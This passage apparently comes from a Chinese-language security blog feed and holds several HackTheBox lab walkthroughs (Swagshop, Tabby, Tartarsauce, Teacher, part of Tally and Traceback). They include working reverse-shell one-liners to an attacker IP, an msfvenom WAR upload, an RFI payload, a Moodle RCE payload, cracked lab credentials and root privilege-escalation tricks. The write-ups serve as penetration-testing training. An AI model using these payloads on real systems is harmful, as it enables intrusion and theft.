<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\public\JuicyPotato.exe -t * -p C:\Users\public\evil.bat -l 3333 -c &#39;&#123;5B3E6773-3A99-4A3D-8096-7765DD11785C&#125;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tally/16.jpg" alt="16"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Swagshop</title>
    <url>/2020/06/27/HTB-Swagshop/</url>
    <content><![CDATA[<h1 id="Swagshop"><a href="#Swagshop" class="headerlink" title="Swagshop"></a>Swagshop</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Swagshop/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问80</p>
<p><img src="/images/Swagshop/2.jpg" alt="2"></p>
<p>发现目标正在运行应用magento</p>
<p>搜索公开漏洞</p>
<p><img src="/images/Swagshop/3.jpg" alt="3"></p>
<p>发现了RCE漏洞</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>修改exp，删除非python注释，还有目标地址</p>
<p><img src="/images/Swagshop/4.jpg" alt="4"></p>
<p>脚本运行成功，创建了admin账户<code>forme/forme</code>并且给出了后台地址</p>
<p><img src="/images/Swagshop/5.jpg" alt="5"></p>
<p>直接登录</p>
<h3 id="修复exp"><a href="#修复exp" class="headerlink" title="修复exp"></a>修复exp</h3><p>继续搜索公开漏洞</p>
<p><img src="/images/Swagshop/7.jpg" alt="7"></p>
<p>尝试通过认证的情况下的RCE</p>
<p>需要修改很多地方，首先根据提示，访问<code>/app/etc/local.xml</code>获取时间</p>
<p><img src="/images/Swagshop/6.jpg" alt="6"></p>
<p>并填写上正确的账号名称</p>
<p><img src="/images/Swagshop/8.jpg" alt="8"></p>
<p>之后运行会报错，是正则出了问题，替换这4行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">br.form.new_control(&#39;text&#39;, &#39;login[username]&#39;, &#123;&#39;value&#39;: username&#125;)  # Had to manually add username control.</span><br><span class="line">br.form.fixup()</span><br><span class="line">br[&#39;login[username]&#39;] &#x3D; username</span><br><span class="line">br[&#39;login[password]&#39;] &#x3D; password</span><br></pre></td></tr></table></figure>

<p>改成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">userone &#x3D; br.find_control(name&#x3D;&quot;login[username]&quot;, nr&#x3D;0)</span><br><span class="line">userone.value &#x3D; username</span><br><span class="line">pwone &#x3D; br.find_control(name&#x3D;&quot;login[password]&quot;, nr&#x3D;0)</span><br><span class="line">pwone.value &#x3D; password</span><br></pre></td></tr></table></figure>

<p>再次运行，又报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AttributeError: &#39;NoneType&#39; object has no attribute &#39;group&#39;</span><br></pre></td></tr></table></figure>

<p>这是因为过去7天没有销售，需要修改</p>
<p><img src="/images/Swagshop/9.jpg" alt="9"></p>
<p>改成<code>2y</code>代表2年</p>
<p>最后RCE成功</p>
<p><img src="/images/Swagshop/10.jpg" alt="10"></p>
<p>整个调试过程中，重要的是打开代理选项</p>
<p><img src="/images/Swagshop/11.jpg" alt="11"></p>
<p>这样才能不断调试</p>
<p>最后获取shell，payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 37811.py http:&#x2F;&#x2F;10.10.10.140&#x2F;index.php&#x2F;admin&#x2F; &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.100&#x2F;4444 0&gt;&amp;1&#39;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Swagshop/12.jpg" alt="12"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现能以sudo运行vi在/var/www/html下</p>
<p><img src="/images/Swagshop/13.jpg" alt="13"></p>
<p>去<a href="https://gtfobins.github.io/#">gtfobins</a>搜索vi，发现了如下命令</p>
<p><img src="/images/Swagshop/15.jpg" alt="15"></p>
<p>修改一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vi &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php -c &#39;:!&#x2F;bin&#x2F;sh&#39; </span><br></pre></td></tr></table></figure>

<p><img src="/images/Swagshop/14.jpg" alt="14"></p>
<p>成功提权</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Tabby</title>
    <url>/2020/09/24/HTB-Tabby/</url>
    <content><![CDATA[<h1 id="Tabby"><a href="#Tabby" class="headerlink" title="Tabby"></a>Tabby</h1><p>kali:10.10.16.10</p>
<p>目标:10.10.10.194</p>
<p>这个靶机不是很困难，但风格非常贴近于OSCP，思路清晰就会很快得到 initial shell</p>
<p>添加hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.194    megahosting.htb</span><br></pre></td></tr></table></figure>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Tabby/1.png" alt="1"></p>
<p>发现了web服务和8080的tomcat</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>首先手动查看80的web服务，在检查页面功能的时候，就可以发现第一个可疑处，file传递的参数</p>
<p><img src="/images/Tabby/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>尝试LFI</p>
<p><img src="/images/Tabby/3.png" alt="3"></p>
<p>看来这个LFI非常好利用，通常对于LFI，我们可以首先尝试读取一些敏感文件如/etc/shadow，如果该服务是root运行的，但这样的机会很少。<br>之后考虑读取/etc/passwd和/etc/ssh/sshd_config，获取普通用户的名称和ssh配置，如果<code>PasswordAuthentication yes</code>可以把爆破ssh列为最后的手段<br>之后考虑源码读取，可以考虑使用php修饰器或者直接包含文件</p>
<p>这里我们尝试直接包含常用web路径<code>/var/www/html</code>下已经发现的news.php</p>
<p><img src="/images/Tabby/4.png" alt="4"></p>
<p>发现页面是空的，直接查看源代码</p>
<p><img src="/images/Tabby/5.png" alt="5"></p>
<p>发现直接获取了源码，可以发现，这里仅仅是fopen，所以这里只是一个文件读取</p>
<p>既然是文件读取，我们可以利用它来获取一些已知服务的敏感信息，回到之前的端口扫描，发现了tomcat，如果能登录tomcat上传war，就可以直接获取shell了，之前已经接触过其他vulnhub，了解过tomcat存在一个存放凭据的文件tomcat-users.xml，我们先手动访问8080端口</p>
<p><img src="/images/Tabby/6.png" alt="6"></p>
<p>这里给出了提示tomcat-users.xml的路径，并且可以发现版本为tomcat9，读取该文件</p>
<p><img src="/images/Tabby/7.png" alt="7"></p>
<p>运气不是很好，没有能直接读到，这里比较坑，我先是考虑的权限问题，又考虑文件位置的问题，谷歌搜索给出的路径是</p>
<p><img src="/images/Tabby/8.png" alt="8"></p>
<p>尝试<code>/usr/share/tomcat9/conf/tomcat-users.xml</code>失败，最后实在没办法在本地apt安装了个tomcat9</p>
<p><img src="/images/Tabby/9.png" alt="9"></p>
<p>这地方浪费了一些时间，其实应该早点本地装一个，得到<code>/usr/share/tomcat9/etc/tomcat-users.xml</code></p>
<p><img src="/images/Tabby/10.png" alt="10"></p>
<p>终于获取凭证<code>tomcat/$3cureP4s5w0rd123!</code>，尝试登录<code>/manager/html</code>，但又遇到了麻烦</p>
<p><img src="/images/Tabby/11.png" alt="11"></p>
<p>无法登录原因在于当前用户的<code>roles</code>不在<code>manager-gui</code>，这就有点稍微棘手了<br>先尝试登录<code>/host-manager/html</code></p>
<p><img src="/images/Tabby/12.png" alt="12"></p>
<p>这个是可以登录的，尝试谷歌搜索<code>manager-script</code>渗透的方式，找到了两篇文章</p>
<p><a href="https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/">https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/</a><br><a href="https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00">https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00</a>        适用</p>
<p>尝试getshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;10.10.16.10 LPORT&#x3D;443 -f war -o evil.war</span><br></pre></td></tr></table></figure>

<p>上传，这里和文章不同，用户名需要和密码需要使用单引号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v -u &#39;tomcat&#39;:&#39;$3cureP4s5w0rd123!&#39; --upload-file evil.war &quot;http:&#x2F;&#x2F;10.10.10.194:8080&#x2F;manager&#x2F;text&#x2F;deploy?path&#x3D;&#x2F;foo&amp;update&#x3D;true&quot;</span><br></pre></td></tr></table></figure>

<p>得到了成功的回显</p>
<p><img src="/images/Tabby/14.png" alt="14"></p>
<p>可以再次确认一下，去<code>/manager/text/list</code>下查看</p>
<p><img src="/images/Tabby/13.png" alt="13"></p>
<p>现在访问shell即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v http:&#x2F;&#x2F;megahosting.htb:8080&#x2F;foo&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tabby/15.png" alt="15"></p>
<p>终于获得了初始shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先通过发现机器存在普通用户<code>ash</code><br>linpeas扫描发现了一个在奇怪位置的备份文件，直接wget下载</p>
<p><img src="/images/Tabby/16.png" alt="16"></p>
<p>传输之后，发现该zip存在密码，直接爆破它</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fcrackzip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u 16162020_backup.zip</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tabby/17.png" alt="17"></p>
<p>尝试使用ssh进行登录，凭据<code>ash/admin@it</code></p>
<p><img src="/images/Tabby/18.png" alt="18"></p>
<p>无法登录，不知道为什么，确实为<code>PasswordAuthentication yes</code><br>通过su切换过去，之前已经发现了，ash用户属于lxd组</p>
<p>搜索公开漏洞</p>
<p><img src="/images/Tabby/19.png" alt="19"></p>
<p>根据脚本提示，完成操作</p>
<ol>
<li>在kali中下载<code>wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine</code></li>
<li><code>bash build-alpine</code><br><img src="/images/Tabby/20.png" alt="20"></li>
</ol>
<p>得到一个压缩包</p>
<p><img src="/images/Tabby/21.png" alt="21"></p>
<ol start="3">
<li>将脚本和压缩包传输到目标机器</li>
</ol>
<p><img src="/images/Tabby/22.png" alt="22"></p>
<p>第一次运行会报错， /usr/bin/env: “bash\r”: 没有那个文件或目录</p>
<p>这主要是因为bash后面多了\r这个字符的原因。在linux终端下，输出\r会什么都不显示，只是把光标移到行首。于是终端虽然输出了/usr/bin/env bash，但是碰到\r后，光标会被移到行首，接着输出了:No such file or directory把前面的覆盖掉了。于是出现了那个莫名其妙的出错信息了</p>
<p>解决办法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用vim打开sh脚本文件， 重新设置文件的格式</span><br><span class="line">：set ff 然后回车 再重新设置下文件格式：</span><br><span class="line">：set ff&#x3D;unix 然后保存退出</span><br><span class="line">：wq! 回车</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tabby/23.png" alt="23"></p>
<p>这样看起来没问题了</p>
<ol start="4">
<li>执行脚本</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;46978.sh -f alpine-v3.12-x86_64-20200924_0317.tar.gz</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tabby/24.png" alt="24"></p>
<p>还是太菜了，主要是tomcat那里处理roles花了很多时间，最后获得root稍微有些曲折，应该仔细检查用户所处的组</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Tartarsauce</title>
    <url>/2020/06/26/HTB-Tartarsauce/</url>
    <content><![CDATA[<h1 id="Tartarsauce"><a href="#Tartarsauce" class="headerlink" title="Tartarsauce"></a>Tartarsauce</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Tartarsauce/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>先目录扫描发现了目录webservices，再在webservices目录里进行目录扫描，终于发现了应用wordpress</p>
<p><img src="/images/Tartarsauce/2.jpg" alt="2"></p>
<p>不过打开后页面无法显示</p>
<p><img src="/images/Tartarsauce/3.jpg" alt="3"></p>
<p>原因来源于绝对路径的错误，少个/，使用burp进行修复<br>提娜佳以下response header和response body就行</p>
<p><img src="/images/Tartarsauce/4.jpg" alt="4"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>既然已经知道目标在运行wp，先用wpscan扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token abcdefg --url http:&#x2F;&#x2F;10.10.10.88&#x2F;webservices&#x2F;wp&#x2F; -e p --plugins-detection aggressive</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tartarsauce/5.jpg" alt="5"></p>
<p>发现插件gwolle，搜索公开漏洞</p>
<p><img src="/images/Tartarsauce/8.jpg" alt="8"></p>
<p><img src="/images/Tartarsauce/6.jpg" alt="6"></p>
<p>该漏洞是个RFI漏洞，会包含一个<code>wp-load.php</code>文件，且不要指定路径<br>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.88&#x2F;webservices&#x2F;wp&#x2F;wp-content&#x2F;plugins&#x2F;gwolle-gb&#x2F;frontend&#x2F;captcha&#x2F;ajaxresponse.php?abspath&#x3D;http:&#x2F;&#x2F;10.10.16.100&#x2F;</span><br></pre></td></tr></table></figure>

<p>注意，我们要关闭apache服务，因为我们的apache服务是带有php环境，这回让我们拿到自己的shell…..所以需要开启另一个http服务不带php环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:&#x2F;var&#x2F;www&#x2F;html#python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tartarsauce/9.jpg" alt="9"></p>
<p>成功获取shell</p>
<p>升级shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">Ctrl+Z</span><br><span class="line">stty raw -echo</span><br><span class="line">fg</span><br><span class="line">reset</span><br><span class="line">xterm-color</span><br><span class="line">export TERM&#x3D;xterm-color</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Tartarsauce/10.jpg" alt="10"></p>
<p>发现onuma能够sudo执行tar命令，可以利用tar切换到他的shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -u onuma tar -cf &#x2F;dev&#x2F;null &#x2F;dev&#x2F;null --checkpoint&#x3D;1 --checkpoint-action&#x3D;exec&#x3D;&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>之后在该账户下发现了一个定时任务</p>
<p><img src="/images/Tartarsauce/11.jpg" alt="11"></p>
<p>搜索改文件</p>
<p><img src="/images/Tartarsauce/12.jpg" alt="12"></p>
<p>查看/usr/sbin/backuperer是一个定时任务的shell脚本，分析它的行为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">basedir&#x3D;&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">bkpdir&#x3D;&#x2F;var&#x2F;backups</span><br><span class="line">tmpdir&#x3D;&#x2F;var&#x2F;tmp</span><br><span class="line">testmsg&#x3D;$bkpdir&#x2F;onuma_backup_test.txt</span><br><span class="line">errormsg&#x3D;$bkpdir&#x2F;onuma_backup_error.txt</span><br><span class="line">tmpfile&#x3D;$tmpdir&#x2F;.$(&#x2F;usr&#x2F;bin&#x2F;head -c100 &#x2F;dev&#x2F;urandom |sha1sum|cut -d&#39; &#39; -f1)</span><br><span class="line">check&#x3D;$tmpdir&#x2F;check</span><br><span class="line"></span><br><span class="line"># formatting</span><br><span class="line">printbdr()</span><br><span class="line">&#123;</span><br><span class="line">    for n in $(seq 72);</span><br><span class="line">    do &#x2F;usr&#x2F;bin&#x2F;printf $&quot;-&quot;;</span><br><span class="line">    done</span><br><span class="line">&#125;</span><br><span class="line">bdr&#x3D;$(printbdr)</span><br><span class="line"></span><br><span class="line"># Added a test file to let us see when the last backup was run</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;printf $&quot;$bdr\nAuto backup backuperer backup last ran at : $(&#x2F;bin&#x2F;date)\n$bdr\n&quot; &gt; $testmsg</span><br><span class="line"></span><br><span class="line"># Cleanup from last time.</span><br><span class="line">&#x2F;bin&#x2F;rm -rf $tmpdir&#x2F;.* $check</span><br><span class="line"></span><br><span class="line"># Backup onuma website dev files.</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo -u onuma &#x2F;bin&#x2F;tar -zcvf $tmpfile $basedir &amp;</span><br><span class="line"></span><br><span class="line"># Added delay to wait for backup to complete if large files get added.</span><br><span class="line">&#x2F;bin&#x2F;sleep 30</span><br><span class="line"></span><br><span class="line"># Test the backup integrity</span><br><span class="line">integrity_chk()</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;usr&#x2F;bin&#x2F;diff -r $basedir $check$basedir</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;bin&#x2F;mkdir $check</span><br><span class="line">&#x2F;bin&#x2F;tar -zxvf $tmpfile -C $check</span><br><span class="line">if [[ $(integrity_chk) ]]</span><br><span class="line">then</span><br><span class="line">    # Report errors so the dev can investigate the issue.</span><br><span class="line">    &#x2F;usr&#x2F;bin&#x2F;printf $&quot;$bdr\nIntegrity Check Error in backup last ran :  $(&#x2F;bin&#x2F;date)\n$bdr\n$tmpfile\n&quot; &gt;&gt; $errormsg</span><br><span class="line">    integrity_chk &gt;&gt; $errormsg</span><br><span class="line">    exit 2</span><br><span class="line">else</span><br><span class="line">    # Clean up and save archive to the bkpdir.</span><br><span class="line">    &#x2F;bin&#x2F;mv $tmpfile $bkpdir&#x2F;onuma-www-dev.bak</span><br><span class="line">    &#x2F;bin&#x2F;rm -rf $check .*</span><br><span class="line">    exit 0</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>这个shell的行为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">压缩&#x2F;var&#x2F;www&#x2F;html的文件到&#x2F;var&#x2F;tmp&#x2F;文件名为随机 存活30秒</span><br><span class="line">创建文件夹&#x2F;var&#x2F;tmp&#x2F;check</span><br><span class="line">解压 随机名 压缩包到&#x2F;var&#x2F;tmp&#x2F;check</span><br><span class="line">对比&#x2F;var&#x2F;www&#x2F;html 和 &#x2F;var&#x2F;tmp&#x2F;check&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">对比会失败，创建backup</span><br><span class="line">程序结束，删除&#x2F;var&#x2F;tmp&#x2F;check</span><br></pre></td></tr></table></figure>

<p>我们的目标是在30秒内，替换掉随机的压缩包</p>
<p>首先使用SUID搞定rootshell的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main ( int argc, char *argv[] )</span><br><span class="line">&#123;</span><br><span class="line">        setreuid(0,0);</span><br><span class="line">        execve(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译<br>对方机器32位，需要安装gcc-multilib，编译指定-m32</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install gcc-multilib</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 -o evil evil.c</span><br></pre></td></tr></table></figure>

<p>创建对比的文件，目录一定要写对/var/www/html</p>
<p><img src="/images/Tartarsauce/14.jpg" alt="14"></p>
<p>传输过去，到对面的/var/tmp</p>
<p>等待倒数到0，监控</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl list-timers</span><br><span class="line">watch -n 1 &#39;systemctl list-timers&#39;</span><br></pre></td></tr></table></figure>

<p>到0后覆盖掉随机文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp evil.tar.gz .c10da7f00a2d034bac1b50a327290c6ada94e</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tartarsauce/15.jpg" alt="15"></p>
<p>之后等到30秒</p>
<p>进入check目录即可获取root</p>
<p><img src="/images/Tartarsauce/13.jpg" alt="13"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Teacher</title>
    <url>/2021/05/14/HTB-Teacher/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Teacher/1.png" alt="1"></p>
<p>目录枚举发现了moodle，一个教师教学的web应用</p>
<p><img src="/images/Teacher/4.png" alt="4"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>主页的源代码有一张奇怪的图片</p>
<p><img src="/images/Teacher/2.png" alt="2"></p>
<p>下载到本地查看，直接就是ASCII字符</p>
<p><img src="/images/Teacher/3.png" alt="3"></p>
<p>用户<code>Giovanni</code>的密码<code>Th4C00lTheacha</code>缺少最后一位，所以我们尝试对密码进行暴力破解，得到<code>#</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ffuf -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Fuzzing&#x2F;special-chars.txt -d &quot;anchor&#x3D;&amp;username&#x3D;Giovanni&amp;password&#x3D;Th4C00lTheachaFUZZ&quot; -u http:&#x2F;&#x2F;10.10.10.153&#x2F;&#x2F;moodle&#x2F;login&#x2F;index.php -b &quot;MoodleSession&#x3D;cvmfh5pcp6dsdv2h1s1qjklfq0&quot; -H &quot;Content-Type: application&#x2F;x-www-form-urlencoded&quot; -mc all -fs 440,27530</span><br></pre></td></tr></table></figure>

<p><img src="/images/Teacher/5.png" alt="5"></p>
<p>使用凭据<code>Giovanni/Th4C00lTheacha#</code></p>
<p><img src="/images/Teacher/6.png" alt="6"></p>
<p>和HTB:Schooled一样的版本枚举，得到版本号3.4</p>
<p><img src="/images/Teacher/7.png" alt="7"></p>
<p>EDB寻找漏洞，找到了CVE-2018-1133</p>
<p><img src="/images/Teacher/8.png" alt="8"></p>
<h2 id="自动"><a href="#自动" class="headerlink" title="自动"></a>自动</h2><p>不过该脚本是PHP脚本，不是很喜欢，但这里可以使用。首先它依靠<code>curl_init()</code>来发送HTTP请求，因此首先需要安装扩展</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install php-curl</span><br></pre></td></tr></table></figure>

<p>之后手动检查脚本，大概了解了运行方式，尝试第一次运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php7.4 46551.php url&#x3D;http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle user&#x3D;Giovanni pass&#x3D;Th4C00lTheacha# ip&#x3D;10.10.16.12 port&#x3D;4444 course&#x3D;2</span><br></pre></td></tr></table></figure>

<p>exploit似乎成功运行，但是并没有返回shell</p>
<p><img src="/images/Teacher/9.png" alt="9"></p>
<p>再次检查，主要关注payload部分，发现它使用了一个python的reverse shell方式</p>
<p><img src="/images/Teacher/10.png" alt="10"></p>
<p>不确定发生了什么，我决定自定义hard code payload，并且进行url编码，类似</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;payload &#x3D; &quot;(%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%36%2e%31%32%2f%34%34%34%34%20%30%3e%26%31%22)&quot;;</span><br></pre></td></tr></table></figure>

<p>不知道为什么，该脚本需要运行两次，可能有的地方写的有点小问题，不过在这之后我成功获得了shell</p>
<p><img src="/images/Teacher/11.png" alt="11"></p>
<h2 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h2><p>找到一篇文章描述了漏洞的原因和利用:<a href="https://blog.sonarsource.com/moodle-remote-code-execution?redirect=rips">链接</a></p>
<p>跟着下面的视频来就行了，需要注意的点是</p>
<p>如何开启quiz，顺序如下。首先打开编辑</p>
<p><img src="/images/Teacher/12.png" alt="12"></p>
<p>创建</p>
<p><img src="/images/Teacher/13.png" alt="13"></p>
<p>选择Quiz即可</p>
<p><img src="/images/Teacher/14.png" alt="14"></p>
<p>然后要注意的是payload选择，Grade要记得选</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*&#123;a*&#x2F;&#96;$_GET[0]&#96;;&#x2F;&#x2F;&#123;x&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Teacher/15.png" alt="15"></p>
<p>最后就可以获得RCE了</p>
<p><img src="/images/Teacher/16.png" alt="16"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>找到数据链接凭据，并成功登陆数据库<code>root/Welkom1!</code></p>
<p><img src="/images/Teacher/17.png" alt="17"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use moodle;</span><br><span class="line">select username,password from mdl_user;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Teacher/18.png" alt="18"></p>
<p>只有一个密码疑似md5，因为32位，尝试破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --format&#x3D;raw-md5</span><br></pre></td></tr></table></figure>

<p>得到密码<code>expelled</code></p>
<p><img src="/images/Teacher/19.png" alt="19"></p>
<p>成功提升到用户权限</p>
<p><img src="/images/Teacher/20.png" alt="20"></p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>发现了backup.sh，查看文件日期，可以知道它是个cronjob</p>
<p><img src="/images/Teacher/22.png" alt="22"></p>
<p>他的内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;giovanni&#x2F;work;</span><br><span class="line">tar -czvf tmp&#x2F;backup_courses.tar.gz courses&#x2F;*;</span><br><span class="line">cd tmp;</span><br><span class="line">tar -xf backup_courses.tar.gz;</span><br><span class="line">chmod 777 * -R;</span><br></pre></td></tr></table></figure>

<p>它移动到目录中，打包一一个目录的文件，然后移动到tmp目录，解压打包的文件，并递归赋予所有文件777权限</p>
<p>这里的漏洞点在于<code>/home/giovanni/work/tmp</code>属于弱权限，我们可以直接对这个目录进行删除，然后添加新的tmp文件，软连接指向任何目录，之后再由root赋予777权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">giovanni@teacher:~&#x2F;work$ rm -r tmp                                                      </span><br><span class="line">giovanni@teacher:~&#x2F;work$ ln -s &#x2F;etc&#x2F; tmp                                                </span><br><span class="line">giovanni@teacher:~&#x2F;work$ ls -l tmp                                                      </span><br><span class="line">lrwxrwxrwx 1 giovanni giovanni 5 May 12 09:03 tmp -&gt; &#x2F;etc&#x2F;</span><br></pre></td></tr></table></figure>

<p>等待一段时间，之后/etc/目录下的所有文件都变成777权限了</p>
<p><img src="/images/Teacher/23.png" alt="23"></p>
<p>修改shadow的root密码为当前用户已知的密码即可</p>
<p><img src="/images/Teacher/24.png" alt="24"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Traceback</title>
    <url>/2020/10/25/HTB-Traceback/</url>
    <content><![CDATA[<h1 id="Traceback"><a href="#Traceback" class="headerlink" title="Traceback"></a>Traceback</h1><p>有些CTF，这台机器的场景是目标已经被其他黑客拿下，我们是第二波攻击者</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/TraceBack/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口提示已经有webshell在这个站点</p>
<p><img src="/images/TraceBack/2.png" alt="2"></p>
<p>用<code>/usr/share/seclists/Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt</code>进行枚举，它包含了一些常见php WebShell的名称</p>
<p><img src="/images/TraceBack/3.png" alt="3"></p>
<p>发现了webshell</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>需要凭据进行登录</p>
<p><img src="/images/TraceBack/4.png" alt="4"></p>
